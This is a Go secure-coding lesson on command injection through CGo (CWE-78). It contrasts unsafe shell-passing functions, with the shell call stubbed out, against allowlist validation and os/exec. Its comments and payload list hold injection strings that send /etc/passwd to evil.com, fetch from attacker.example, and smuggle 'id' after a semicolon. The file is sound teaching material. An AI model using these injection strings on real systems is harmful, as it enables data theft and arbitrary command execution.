// TOPIC: Command Injection via CGo
// CWE-78: Improper Neutralization of Special Elements in an OS Command
//
// Passing user-controlled strings to C functions that invoke a shell
// (system(), popen(), execl("/bin/sh", "sh", "-c", userInput, ...))
// allows the attacker to inject shell metacharacters and run arbitrary commands.
//
// CGo makes this worse because:
//  - The call bypasses Go's os/exec argument-list safety entirely.
//  - The C side may not type-check or validate the string at all.
//  - Injection lives one layer below the Go security boundary.
//
// Injection characters: ; | & ` $() > < \n * ? ~ ! { }
//
// Run: go run ./06_cgo_injection/

package main

/*
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Simulates a legacy C library function that calls system().
// We use printf instead of system() so the demo doesn't run real commands.
void c_run_shell_UNSAFE(const char* cmd) {
    printf("[C] would call system(\"%s\")\n", cmd);
    // Real vulnerable code: system(cmd);
}

// A safe C helper — processes the argument directly, never invokes a shell.
void c_print_filename(const char* filename) {
    printf("[C] processing file: %s\n", filename);
}
*/
import "C"
import (
	"errors"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"unsafe"
)

// ── ANTI-PATTERNS ─────────────────────────────────────────────────────────────

// antipatternDirectShellPass sends user input straight to a C function that
// invokes a shell. The shell interprets ; | & ` $() etc. as metacharacters.
//
// Attacker input: "report.pdf; curl https://evil.com/$(cat /etc/passwd)"
func antipatternDirectShellPass(userInput string) {
	cCmd := C.CString(userInput)
	defer C.free(unsafe.Pointer(cCmd))

	fmt.Printf("ANTI-PATTERN | Sending to C shell function: %q\n", userInput)
	C.c_run_shell_UNSAFE(cCmd) // shell metacharacters are NOT escaped
}

// antipatternConcatCommand builds a shell command by string concatenation —
// the most common injection pattern in legacy code.
//
// Attacker input: "../../etc/passwd; id"
func antipatternConcatCommand(filename string) {
	// WRONG: user-controlled data concatenated into a shell command string.
	cmd := "cat /data/" + filename
	cCmd := C.CString(cmd)
	defer C.free(unsafe.Pointer(cCmd))

	fmt.Printf("ANTI-PATTERN | Shell command via concatenation: %q\n", cmd)
	C.c_run_shell_UNSAFE(cCmd)
}

// ── SAFE ALTERNATIVES ─────────────────────────────────────────────────────────

// allowlist accepts only safe filename characters — no shell metacharacters.
var safeFilename = regexp.MustCompile(`^[a-zA-Z0-9][a-zA-Z0-9._-]{0,253}$`)

// validateFilename rejects any input that could be a shell injection vector.
func validateFilename(name string) error {
	if len(name) == 0 {
		return errors.New("filename is empty")
	}
	if strings.Contains(name, "..") {
		return errors.New("path traversal detected")
	}
	if !safeFilename.MatchString(name) {
		return fmt.Errorf("filename %q contains disallowed characters", name)
	}
	return nil
}

// safeExecCommand uses os/exec with a separated argument list.
// No shell is invoked — each argument is passed verbatim to the OS.
// Metacharacters like ; | & are treated as literal characters, not operators.
func safeExecCommand(filename string) error {
	if err := validateFilename(filename); err != nil {
		return fmt.Errorf("input rejected: %w", err)
	}
	// exec.Command never passes args through a shell.
	cmd := exec.Command("/bin/cat", "/data/"+filename)
	fmt.Printf("SAFE (exec)  | Would run: %s %s (no shell, no injection)\n",
		cmd.Path, strings.Join(cmd.Args[1:], " "))
	return nil
}

// safeCFunctionWithValidation shows that even CGo can be safe when:
//  1. The C function does NOT invoke a shell.
//  2. Input is validated against an allowlist before crossing the CGo boundary.
func safeCFunctionWithValidation(filename string) error {
	if err := validateFilename(filename); err != nil {
		return fmt.Errorf("input rejected before CGo: %w", err)
	}
	cFilename := C.CString(filename)
	defer C.free(unsafe.Pointer(cFilename))

	// Safe: c_print_filename does not call system() or any shell.
	C.c_print_filename(cFilename)
	return nil
}

func main() {
	fmt.Println("=== 06: Command Injection via CGo ===")
	fmt.Println()

	payloads := []string{
		"report.pdf",                         // benign
		"file.txt; id",                       // semicolon injection
		"../../etc/passwd",                   // path traversal
		"$(curl https://attacker.example/x)", // command substitution
	}

	fmt.Println("── Anti-patterns ──")
	for _, p := range payloads {
		antipatternDirectShellPass(p)
	}
	fmt.Println()
	for _, p := range payloads {
		antipatternConcatCommand(p)
	}
	fmt.Println()

	fmt.Println("── Safe: os/exec with argument list ──")
	for _, p := range payloads {
		if err := safeExecCommand(p); err != nil {
			fmt.Printf("SAFE (exec)  | %v\n", err)
		}
	}
	fmt.Println()

	fmt.Println("── Safe: validated CGo call ──")
	for _, p := range payloads {
		if err := safeCFunctionWithValidation(p); err != nil {
			fmt.Printf("SAFE (CGo)   | %v\n", err)
		}
	}
}
